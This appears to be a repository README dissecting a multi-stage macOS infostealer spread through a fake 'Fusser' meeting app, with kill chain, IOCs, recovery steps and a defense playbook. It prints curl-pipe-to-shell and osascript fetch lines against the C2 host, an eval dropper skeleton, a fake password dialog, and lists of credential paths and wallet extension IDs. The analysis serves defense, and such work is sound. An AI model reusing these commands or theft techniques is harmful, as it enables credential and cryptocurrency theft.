# The Fusser Files

### A Forensic Dissection of a Multi-Stage macOS Infostealer

> *"Daniel Beaumont would like to book a call with you regarding Cyrus Global Holding."*
> — The email that starts the heist

---

## Prologue: The Email That Offers You a CTO Role

It arrives in your inbox looking perfectly professional. A meeting request.
"**Daniel Beaumont** would like to book a call with you regarding **Cyrus Global
Holding**." The role? **Founding CTO**. Duration: 30 minutes. There's a clean
"Select Time Slot" button and a calendar link at `fusser.ai/calendar/...`.

It's sent "via Fusser" — which looks like just another Calendly clone. You click
through to a polished landing page with testimonials, a 4.9 star rating (2,847
reviews!), integration logos for Slack, Notion, and Figma. It looks like every
other SaaS scheduling tool you've seen this year.

![The phishing email](docs/assets/phishing-email.png)

*The actual phishing email. Note the professional formatting, the specific role
("Founding CTO"), and the fusser.ai calendar link — all designed to create
urgency and legitimacy for a developer who'd be excited about a CTO opportunity.*

Except Fusser doesn't exist. The video calls don't work. The testimonials are
fake. The "app" is a three-stage macOS infostealer called **MacSync Stealer**
that will empty your crypto wallets, steal your passwords, clone your Telegram,
exfiltrate your SSH keys, backdoor your Ledger hardware wallet app, and upload
everything to a server in a zip file named `osalogging.zip`.

This repository contains the complete attack chain, fully defanged and annotated
for educational analysis.

---

## Table of Contents

- [The Kill Chain](#the-kill-chain)
- [Chapter I: The Bait — fusser.ai](#chapter-i-the-bait--fusserai)
- [Chapter II: The Hook — Stage 1 Dropper](#chapter-ii-the-hook--stage-1-dropper)
- [Chapter III: The Daemon — Stage 2 C2 Communication](#chapter-iii-the-daemon--stage-2-c2-communication)
- [Chapter IV: The Heist — Stage 3 AppleScript Stealer](#chapter-iv-the-heist--stage-3-applescript-stealer)
  - [Act 1: Kill the Witness](#act-1-kill-the-witness)
  - [Act 2: The Fake Password Dialog](#act-2-the-fake-password-dialog)
  - [Act 3: The Browser Raid](#act-3-the-browser-raid)
  - [Act 4: The Wallet Sweep](#act-4-the-wallet-sweep)
  - [Act 5: The Skeleton Key Collection](#act-5-the-skeleton-key-collection)
  - [Act 6: The Document Grab](#act-6-the-document-grab)
  - [Act 7: The Ledger Trojan](#act-7-the-ledger-trojan)
  - [Act 8: Packaging and Exfiltration](#act-8-packaging-and-exfiltration)
- [IOCs — Indicators of Compromise](#iocs--indicators-of-compromise)
- [If You Got Hit](#if-you-got-hit)
- [Appendix A: Full Extension ID List](#appendix-a-full-extension-id-list)
- [Appendix B: Defense Playbook](#appendix-b-defense-playbook)

---

## The Kill Chain

```
Phishing email: "Founding CTO" meeting request
        |  from "Daniel Beaumont" at "Cyrus Global Holding"
        |  sent "via Fusser" with calendar link
        v
  fusser.ai (fake SaaS landing page)
        |
        v
  "Enter invite code to join meeting"
        |
        v
  sorvensorven.com/api/download → .dmg (Mac) or .msi (Windows)
        |
        v  (Mac variant analyzed here)
  curl -kfsSL http://fusser-api.com/curl/<token> | zsh
        |
        v
  Stage 1: base64+gzip → eval          ← You are here reading this
        |
        v
  Stage 2: Background daemon
        |── Fetch AppleScript from C2 → pipe to osascript
        |── Upload stolen data in 10MB chunks
        v
  Stage 3: "MacSync Stealer" v1.1.2 (35KB AppleScript)
        |── Steal macOS password (fake dialog)
        |── Steal 13 Chromium browsers (cookies, passwords, autofill)
        |── Steal 60+ browser wallet extensions
        |── Steal 4 Firefox/Gecko browsers
        |── Steal 21+ desktop crypto wallets
        |── Steal Telegram sessions
        |── Steal macOS Keychains
        |── Steal SSH, AWS, Kubernetes credentials
        |── Steal shell history and git config
        |── Grab sensitive files (pdf, seed, kdbx, pem, ovpn...)
        |── Steal Safari cookies and Apple Notes
        |── Record system info and processes
        |── Package → /tmp/osalogging.zip
        |── Backdoor Ledger Wallet.app
        └── Backdoor Ledger Live.app
```

---

## Chapter I: The Bait — fusser.ai

The attack begins with a phishing email impersonating a meeting request from
"**Daniel Beaumont**" at "**Cyrus Global Holding**", offering a **Founding CTO**
role. The email is formatted as a professional meeting scheduler — clean card
layout, company name, role, duration (30 minutes), and a "Select Time Slot"
button linking to `fusser.ai/calendar/<uuid>`.

The link leads to **fusser.ai**, a polished React SPA that poses as an
"AI-Powered Team Collaboration Platform." The site features:

- Professional landing page with feature sections
- Fake testimonials with stock photos from Unsplash
- Integration badges (Slack, Notion, Figma, Jira, etc.)
- Schema.org markup claiming 4.9/5 stars from 2,847 reviews
- Legitimate-looking meta tags and Open Graph cards

The frontend is served from fusser.ai but the **real backend** is
`sorvensorven.com`. The download flow requires an **access code** (sent to
victims via DM), which gates the malware delivery:

```
GET sorvensorven.com/api/download?access_code=VICTIM_CODE&type=fusser&os=Mac
→ { "download_url": "https://..." }
```

The access code personalizes each download, giving the attacker per-victim
tracking. When the user "installs" the Mac app, it actually runs a shell command.

**OPSEC Failures:**
- `og:url` says `fusser.io` but the site is `fusser.ai` (copy-paste from template)
- Theme color `#0ea5e9` is literally Tailwind's `sky-500` default
- The canonical URL points to `fusser.io` (domain mismatch)
- Backend domain `sorvensorven.com` is... not great branding for a legitimate tool

---

## Chapter II: The Hook — Stage 1 Dropper

**File:** [`analysis/stage1_dropper.sh`](analysis/stage1_dropper.sh)
**Trigger:** `curl -kfsSL http://fusser-api.com/curl/<token> | zsh`

The victim runs a curl-pipe-shell command. The script contains a base64+gzip
encoded payload inside a heredoc:

```bash
#!/bin/zsh
d9804=$(base64 -D <<'PAYLOAD_m21538190221297' | gunzip
H4sIACE8nGkAA91WW2/bNhR+968... [1312 bytes]
PAYLOAD_m21538190221297
)
eval "$d9804"    # ← blind execution of decoded payload
```

**Obfuscation techniques:**
- Random variable name `d9804` evades grep
- Random heredoc delimiter `PAYLOAD_m21538190221297` evades pattern matching
- base64 + gzip double-encoding hides content from casual inspection
- `curl -k` disables TLS verification (MITM-friendly)
- `curl -f` fails silently (no error output)
- `curl -sS` suppresses progress but shows errors
- The entire thing is one command — no intermediate files to inspect

**Neutralization:** Payload removed, `eval` eliminated. See
[fix/neutralize-stage1-dropper](../../commit/HEAD~5).

---

## Chapter III: The Daemon — Stage 2 C2 Communication

**File:** [`analysis/stage2_daemon.sh`](analysis/stage2_daemon.sh)
**Decoded from:** Stage 1 payload

The decoded shell script runs as a **background daemon** that:

1. **Goes invisible** — redirects stdin/stdout/stderr to `/dev/null`
2. **Fetches the real payload** — HTTP GET to C2, pipes response to `osascript`
3. **Exfiltrates stolen data** — chunked PUT uploads to C2

```bash
daemon_function() {
    exec </dev/null >/dev/null 2>/dev/null     # vanish from terminal

    # Fetch + execute AppleScript payload
    curl ... "http://fusser-api.com/dynamic?txd=$token" | osascript

    # Upload stolen data in 10MB chunks
    dd if=/tmp/osalogging.zip ... | curl -X PUT ... "http://fusser-api.com/gate?..."
}
daemon_function "$@" &     # background and exit
```

**C2 Protocol:**
| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/dynamic?txd=<token>` | GET | Fetch AppleScript stealer |
| `/dynamic?txd=<token>&pwd=<pass>` | GET | Fetch stealer (with pre-stolen password) |
| `/gate?buildtxd=<token>&upload_id=<id>&chunk_index=N&total_chunks=M` | PUT | Upload stolen data |

**Upload Protocol:**
- Chunk size: 10 MB
- Max retries: 8 per chunk
- Backoff: `3 + attempt * 2` seconds (exponential)
- User-Agent: Spoofed as Chrome on macOS
- API key: `5190ef1733183a0dc63fb623357f56d6`

**Neutralization:** All C2 URLs defanged, API keys redacted, upload logic removed.
See [fix/neutralize-stage2-c2-daemon](../../commit/HEAD~3).

---

## Chapter IV: The Heist — Stage 3 AppleScript Stealer

**File:** [`analysis/stage3_stealer.applescript`](analysis/stage3_stealer.applescript)
**Size:** 35,015 bytes (641 lines)
**Self-ID:** "MacSync Stealer" v1.1.2, Build Tag N3

This is where the real damage happens. A 35KB AppleScript that systematically
loots every valuable thing on your Mac.

### Act 1: Kill the Witness

```applescript
try
    do shell script "killall Terminal"
end try
```

First thing it does: kill Terminal. If you were watching, you're not anymore.

### Act 2: The Fake Password Dialog

The stealer needs your macOS login password to decrypt Keychain data. It gets it
by showing a **pixel-perfect fake System Preferences dialog**:

```applescript
display dialog "Please enter your password to make changes."
    default answer ""
    with icon "/System/Library/CoreServices/CoreTypes.bundle/.../LockedIcon.icns"
    buttons {"Continue"}
    default button "Continue"
    giving up after 150
    with title "System Preferences"
    with hidden answer
```

**Why this works:**
- Uses Apple's own `LockedIcon.icns` — looks identical to real prompts
- Title says "System Preferences"
- Hidden answer field shows dots like real password fields
- **No Cancel button** — only "Continue"
- **Loops forever** until you enter the correct password
- Validates with `dscl . authonly` — confirms the password is real

If the account has no password, it steals the Chrome master password instead:
```applescript
security find-generic-password -ga "Chrome"
```

### Act 3: The Browser Raid

**13 Chromium browsers targeted:**

| Browser | Path |
|---------|------|
| Chrome | `~/Library/Application Support/Google/Chrome/` |
| Brave | `~/Library/Application Support/BraveSoftware/Brave-Browser/` |
| Edge | `~/Library/Application Support/Microsoft Edge/` |
| Arc | `~/Library/Application Support/Arc/User Data` |
| Opera | `~/Library/Application Support/com.operasoftware.Opera/` |
| Opera GX | `~/Library/Application Support/com.operasoftware.OperaGX/` |
| Vivaldi | `~/Library/Application Support/Vivaldi/` |
| Yandex | `~/Library/Application Support/Yandex/YandexBrowser/` |
| Chrome Beta | `~/Library/Application Support/Google/Chrome Beta/` |
| Chrome Canary | `~/Library/Application Support/Google/Chrome Canary` |
| Chrome Dev | `~/Library/Application Support/Google/Chrome Dev/` |
| Chromium | `~/Library/Application Support/Chromium/` |
| CocCoc | `~/Library/Application Support/CocCoc/Browser/` |

**Files stolen per profile:**
- `Cookies` / `Network/Cookies` — session tokens, auth cookies
- `Login Data` — saved passwords (encrypted with system keychain)
- `Web Data` — autofill data (credit cards, addresses, phone numbers)

**4 Gecko/Firefox browsers targeted:**
- Firefox, Zen, LibreWolf, Waterfox

**Gecko files stolen per profile:**
- `key4.db` — master encryption key
- `logins.json` / `logins-backup.json` — encrypted passwords
- `cookies.sqlite` — all cookies
- `formhistory.sqlite` — form autofill
- `cert9.db` — certificate database
- `places.sqlite` — browsing history + bookmarks

### Act 4: The Wallet Sweep

This is the main event. The stealer targets **60+ browser extension wallets** and
**21+ desktop wallet applications**.

**Browser Extension Wallets** (partial list):

| Extension | ID |
|-----------|-----|
| MetaMask | `nkbihfbeogaeaoehlefnkodbefgpgknn` |
| Phantom | `bfnaelmomeimhlpmgjnjophhpkkoljpa` |
| Coinbase Wallet | `hnfanknocfeofbddgcijnmhnfnkdnaad` |
| Rabby | `acmacodkjbdgmoleebolmdjonilkdbch` |
| OKX Wallet | `mcohilncbfahbmgdjkbpemcciiolgcge` |
| Solflare | `bhhhlbepdkbapadjdnnojkbgioiodbic` |
| Backpack | `cjmkndjhnagcfbpiemnkdpomccnjblmj` |
| TronLink | `ibnejdfjmmkpcnlpebklmnkoeoihofec` |

See [Appendix A](#appendix-a-full-extension-id-list) for the full list of 60+ extension IDs.

**Desktop Wallets:**

| Wallet | Path |
|--------|------|
| Exodus | `~/Library/Application Support/Exodus/` |
| Electrum | `~/.electrum/wallets/` |
| Atomic Wallet | `~/Library/Application Support/Atomic Wallet/Local Storage/leveldb/` |
| Bitcoin Core | `~/Library/Application Support/Bitcoin/` |
| Monero | `~/.bitmonero/wallets/` |
| Sparrow | `~/.sparrow/wallets/` |
| Wasabi | `~/.walletwasabi/client/Wallets/` |
| Ledger Live | `~/Library/Application Support/Ledger Live/` |
| Trezor Suite | `~/Library/Application Support/@trezor` |
| + 12 more | Coinomi, Guarda, Armory, Dash, Dogecoin, Litecoin... |

### Act 5: The Skeleton Key Collection

Beyond browsers and wallets, the stealer grabs every credential on the system:

| Target | What's Stolen |
|--------|--------------|
| **macOS Keychains** | `~/Library/Keychains/*.keychain-db` — every saved password |
| **SSH Keys** | `~/.ssh/` — access to servers, GitHub, GitLab |
| **AWS Credentials** | `~/.aws/` — cloud infrastructure access |
| **Kubernetes** | `~/.kube/` — container cluster access |
| **Shell History** | `.zshrc`, `.zsh_history`, `.bash_history` — command history |
| **Git Config** | `.gitconfig` — identity and credentials |
| **Telegram** | `tdata/` — full session clone |
| **Safari** | `Cookies.binarycookies`, `Form Values`, `History.db` |
| **Apple Notes** | `NoteStore.sqlite*` — all notes |
| **System Info** | `system_profiler`, `ps ax`, `lsappinfo list` |

### Act 6: The Document Grab

Searches Desktop, Documents, and Downloads for sensitive files:

**Targeted extensions:** `pdf`, `docx`, `doc`, `wallet`, `key`, `keys`, `db`,
`txt`, `seed`, `rtf`, `kdbx`, `pem`, `ovpn`

- `.seed` — crypto seed phrases
- `.kdbx` — KeePass password databases
- `.pem` — SSL/SSH certificates and keys
- `.ovpn` — VPN credentials
- `.wallet` / `.key` — crypto wallet files

Size limit: 10 MB total across all grabbed files.

### Act 7: The Ledger Trojan

The most insidious part. If Ledger Wallet or Ledger Live is installed in
`/Applications`, the stealer **backdoors the application itself**:

1. Downloads trojanized `app.asar` + `Info.plist` from C2
2. Copies the legitimate app to `/tmp` as backup
3. Deletes the original from `/Applications`
4. Moves the backup back (resets quarantine attributes)
5. Replaces `Contents/Resources/app.asar` with the trojan
6. Replaces `Contents/Info.plist` with the trojan
7. Ad-hoc codesigns: `codesign -f -d -s -`

**Why this is devastating:**
- `app.asar` is the Electron app bundle — it controls ALL behavior
- The trojaned Ledger app would intercept seed phrases and transaction signing
- The app looks and works identically to the user
- Copy-delete-move resets macOS quarantine flags
- Ad-hoc signing bypasses Gatekeeper for already-trusted apps

**C2 URLs (defanged):**
- `https://fusser-api[.]com/ledger/<token>` (Ledger Wallet)
- `https://fusser-api[.]com/ledger/live/<token>` (Ledger Live)

### Act 8: Packaging and Exfiltration

After all theft is complete:

1. **Package:** `ditto -c -k --sequesterRsrc /tmp/sync<random>/ /tmp/osalogging.zip`
2. **Cleanup:** `rm -rf /tmp/sync*` (delete staging directory)
3. **Cover story:** Display fake error dialog:
   > "Your Mac does not support this application. Try reinstalling or
   > downloading the version for your system."

   Note: The "OK" button uses Cyrillic "О" (U+041E) not Latin "O" — an
   anti-grep evasion technique.

4. **Upload:** Stage 2 daemon uploads the zip in 10MB chunks to
   `fusser-api[.]com/gate`

**Neutralization:** All functions replaced with no-ops, all shell commands
commented out, all URLs defanged. See
[fix/neutralize-stage3-credential-theft](../../commit/HEAD~1).

---

## IOCs — Indicators of Compromise

### Domains (defanged)
| Domain | Purpose |
|--------|---------|
| `fusser[.]ai` | Landing page / social engineering |
| `fusser-api[.]com` | C2 server (payload delivery + exfiltration) |
| `sorvensorven[.]com` | Backend API (download gating, access code validation) |

### API Keys & Tokens
| Value | Purpose |
|-------|---------|
| `5190ef1733183a0dc63fb623357f56d6` | C2 API key |
| `d0efbd68b1c2...c58` | Victim/campaign tracking token |

### Filesystem Indicators
| Path | Indicates |
|------|-----------|
| `/tmp/sync*/` | Active theft in progress |
| `/tmp/osalogging.zip` | Packaged stolen data ready for upload |
| `/tmp/app.asar` | Ledger backdoor staging |
| `/tmp/d0efbd68...c58.zip` | Downloaded Ledger trojan |

### Network Indicators
| Pattern | Purpose |
|---------|---------|
| `GET /dynamic?txd=` | Fetching AppleScript payload |
| `PUT /gate?buildtxd=` | Uploading stolen data |
| `GET /ledger/` | Downloading Ledger trojans |
| `GET /api/download?access_code=` | Download gating |
| User-Agent contains `AppleWebKit/537.36` | Spoofed browser UA |

### Process Indicators
- `osascript` running with network activity
- Background `zsh` process with `/dev/null` stdio
- `ditto` compressing `/tmp/sync*`
- `curl` connecting to `fusser-api.com`

---

## If You Got Hit

If you ran this script or installed "Fusser", act **immediately**:

1. **Passwords:** Change your macOS login password and all saved passwords
2. **Browser sessions:** Sign out of all sessions on all browsers, revoke all active sessions
3. **SSH keys:** Regenerate all SSH keys, update authorized_keys everywhere
4. **AWS/Kube:** Rotate all cloud credentials immediately
5. **Crypto wallets:** Transfer all assets to NEW wallets with NEW seed phrases
6. **Ledger check:** Verify your Ledger app's `app.asar` hash against official release
7. **Telegram:** Terminate all other sessions in Settings → Devices
8. **Keychain:** Assume all Keychain passwords are compromised
9. **2FA:** Re-enroll all 2FA tokens
10. **Monitor:** Watch for unauthorized access to all accounts

---

## Appendix A: Full Extension ID List

### Password Managers & Authenticators (40+ IDs)
```
eiaeiblijfjekdanodkjadfinkhbfgcd  aeblfdkhhhdcdjpifhhbdiojplfjncoa
bfogiafebfohielmmehodmfbbebbbpei  nngceckbapebfimnlniiiahkandclblb
fdjamakpfbbddfjaooikfcpapjohcfmg  hdokiejnpimakedhajhdlcegeplioahd
pnlccmojcmeohlpggmfnbbiapkmbliob  ghmbeldphafepmbegfdlkpapadhbakde
kmcfomidfpdkfieipokbalgegidffkal  bnfdmghkeppfadphbnkjcicejfepnbfe
caljgklbbfbcjjanaijlacgncafpegll  folnjigffmbjmcjgmbbfcpleeddaedal
igkpcodhieompeloncfnbekccinhapdb  admmjipmmciaobhojoghlmleefbicajg
ehpbfbahieociaeckccnklpdcmfaeegd  epanfjkfahimkgomnigadpkobaefekcd
didegimhafipceonhjepacocaffmoppf  oboonakemofpalcgghocfoadofidjkkk
jgnfghanfbjmimbdmnjfofnbcgpkbegj  mmhlniccooihdimnnjhamobppdhaolme
dbfoemgnkgieejfkaddieamagdfepnff  bhghoamapcdpbohphigoooaddinpkbai
lojeokmpinkpmpbakfkfpgfhpapbgdnd  ibpjepoimpcdofeoalokgpjafnjonkpc
gmohoglkppnemohbcgjakmgengkeaphi  dckgbiealcgdhgjofgcignfngijpbgba
gmegpkknicehidppoebnmbhndjigpica  eiokpeobbgpinbmcanngjjbklmhlepan
odfkmgboddhcgopllebhkbjhokpojigd  ppnbnpeolgkicgegkbkbjmhlideopiji
cejfhijdfemlohmcjknpbeaohedoikpp  nmhjblhloefhbhgbfkdgdpjabaocnhha
iklgijhacenjgjgdnpnohbafpbmnccek  ppkkcfblhfgmdmefkmkoomenhgecbemi
lgndjfkadlbpaifdpbbobdodbaiaiakb  bbphmbmmpomfelajledgdkgclfekilei
bnfooenhhgcnhdkdjelgmmkpaemlnoek
```

### Crypto Wallet Extensions (60+ IDs)
```
nkbihfbeogaeaoehlefnkodbefgpgknn  bfnaelmomeimhlpmgjnjophhpkkoljpa  (MetaMask, Phantom)
hnfanknocfeofbddgcijnmhnfnkdnaad  fnjhmkhhmkbjkkabndcnnogagogbneec  (Coinbase, Ronin)
acmacodkjbdgmoleebolmdjonilkdbch  egjidjbpglichdcondbcbdnbeeppgdph  (Rabby, Trust)
aholpfdialjgjfhomihkjbmgjidlcdno  pdliaogehgdbhbnmkklieghmmjkpigpa  (Temple, Keplr)
mcohilncbfahbmgdjkbpemcciiolgcge  hpglfhgfnhbgpjdenjgmdgoeiappafln  (OKX, Braavos)
bhhhlbepdkbapadjdnnojkbgioiodbic  cjmkndjhnagcfbpiemnkdpomccnjblmj  (Solflare, Backpack)
kamfleanhcmjelnhaeljonilnmjpkcjc  jnldfbidonfeldmalbflbmlebbipcnle
fdcnegogpncmfejlfnffnofpngdiejii  klnaejjgbibmhlephnhpmaofohgkpgkd
kjjebdkfeagdoogagbhepmbimaphnfln  ldinpeekobnhjjdofggfgjlcehhmanlj
kpfchfdkjhcoekhdldggegebfakaaiog  idnnbdplmphpflfnlkomgpfbpcgelopg
mlhakagmgkmonhdonhkpjeebfphligng  bipdhagncpgaccgdbddmbpcabgjikfkn
nhnkbkgjikgcigadomkphalanndcapjk  klghhnkeealcohjjanjjdaeeggmfmlpl
ebfidpplhabeedpnhjnobghokpiioolj  emeeapjkbcbpbpgaagfchmcgglmebnen
fldfpgipfncgndfolcbkdeeknbbbnhcc  penjlddjkjgpnkllboccdgccekpkcbin
hmeobnfnfcmdkdcmlblgagmfpfboieaf  omaabbefbmiijedngplfjmnooppbclkk
jnlgamecbpmbajjfhmmmlhejkemejdma  fpkhgmpbidmiogeglndfbkegfdlnajnf
bifidjkcdpgfnlbcjpdkdcnbiooooblg  amkmjjmmflddogmhpjloimipbofnfjih
aeachknmefphepccionboohckonoeemg  dmkamcknogkgcdfhhbddcghachkejeap
aiifbnbfobpmeekipheeijimdpnlpgpp  ehgjhhccekdedpbkifaojjaefeohnoea
nknhiehlklippafakaeklbeglecifhad  nphplpgoakhhjchkkhmiggakijnkhfnd
ibnejdfjmmkpcnlpebklmnkoeoihofec  afbcbjpbpfadlkmhmclhkeeodmamcflc
efbglgofoippbgcjepnhiblaibcnclgk  fccgmnglbhajioalokbcidhcaikhlcpm
mgffkfbidihjpoaomajlbgchddlicgpn  fopmedgnkfpebgllppeddmmochcookhc
jojhfeoedkpkglbfimdfabpdfjaoolaf  abkahkcbhngaebpcgfmhkoioedceoigp
gkeelndblnomfmjnophbhfhcjbcnemka  hgbeiipamcgbdjhfflifkgehomnmglgk
ellkdbaphhldpeajbepobaecooaoafpg  mdnaglckomeedfbogeajfajofmfgpoae
ckklhkaabbmdjkahiaaplikpdddkenic  fmblappgoiilbgafhjklehhfifbdocee
cnmamaachppnkjgnildpdmkaakejnhae  fijngjgcjhjmmpcmkeiomlglpeiijkld
lbjapbcmmceacocpimbpbidpgmlmoaao  ibljocddagjghmlpgihahamcghfggcjc
gkodhkbmiflnmkipcmlhhgadebbeijhh  dbgnhckhnppddckangcjbkjnlddbjkna
agoakfejjabomempkjlepdflaleeobhb  dgiehkgfknklegdhekgeabnhgfjhbajd
onhogfjeacnfoofkfgppdlbmlmnplgbn  ojggmchlghnjlapmfbnjholfjkiidbch
pmmnimefaichbcnbndcfpaagbepnjaig  anokgmphncpekkhclmingpimjmcooifb
kkpllkodjeloidieedojogacfhpaihoh  iokeahhehimjnekafflcihljlcjccdbe
ifckdpamphokdglkkdomedpdegcjhjdp  loinekcabhlmhjjbocijdoimmejangoa
fcfcfllfndlomdhbehjjcoimbgofdncg  ifclboecfhkjbpmhgehodcjpciihhmif
ookjlbkiijinhpmnjffcofjonbfbgaoc  oafedfoadhdjjcipmcbecikgokpaphjk
mapbhaebnddapnmifbbkgeedkeplgjmf  lgmpcpglpngdoalbgeoldeajfclnhafa
ppbibelpcjmhbdihakflkdcoccbgbkpo  ffnbelfdoeiohenkjibnmadjiehjhajb
opcgpfmipidbgpenhmajoajpbobppdil  hdkobeeifhdplocklknbnejdelgagbao
lnnnmfcpbkafcpgdilckhmhbkkbpkmid  nbdhibgjnjpnkajaghbffjbkcgljfgdi
kmhcihpebfmpgmihbkipmjlmmioameka  kmphdnilpmdejikjdnlbcnmnabepfgkh
```

---

## Appendix B: Defense Playbook

1. **Never run `curl | sh`** — always download, inspect, then execute
2. **Verify app signatures** — `codesign -vvvv /Applications/App.app`
3. **Use a password manager** — don't save passwords in browsers
4. **Hardware 2FA** — YubiKey for critical accounts
5. **Monitor `/tmp`** — watch for `sync*` directories and `osalogging.zip`
6. **Disable automatic tasks** — VS Code, npm scripts, etc.
7. **Use Little Snitch or LuLu** — monitor outbound network connections
8. **Be skeptical** — no legitimate tool requires `curl | sh` to join a call

---

## Repository Structure

```
fusser/
├── analysis/
│   ├── stage1_dropper.sh           # NEUTRALIZED: Base64+gzip eval dropper
│   ├── stage2_daemon.sh            # NEUTRALIZED: C2 daemon + exfiltration
│   └── stage3_stealer.applescript  # NEUTRALIZED: Full infostealer (35KB)
├── docs/
│   └── index.html                  # Educational parody landing page
└── README.md                       # This file
```

## Git History (PRs)

| # | Branch | What Was Neutralized |
|---|--------|---------------------|
| 1 | `fix/neutralize-stage1-dropper` | Removed eval + base64 payload |
| 2 | `fix/neutralize-stage2-c2-daemon` | Defanged C2 URLs, removed osascript pipe + upload |
| 3 | `fix/neutralize-stage3-credential-theft` | Defanged all 11 attack sections of the stealer |

---

*Maintained by [Hanzo AI](https://hanzo.ai) for security education and awareness.*
*If this helped you, star the repo and share it with a developer who needs to see it.*
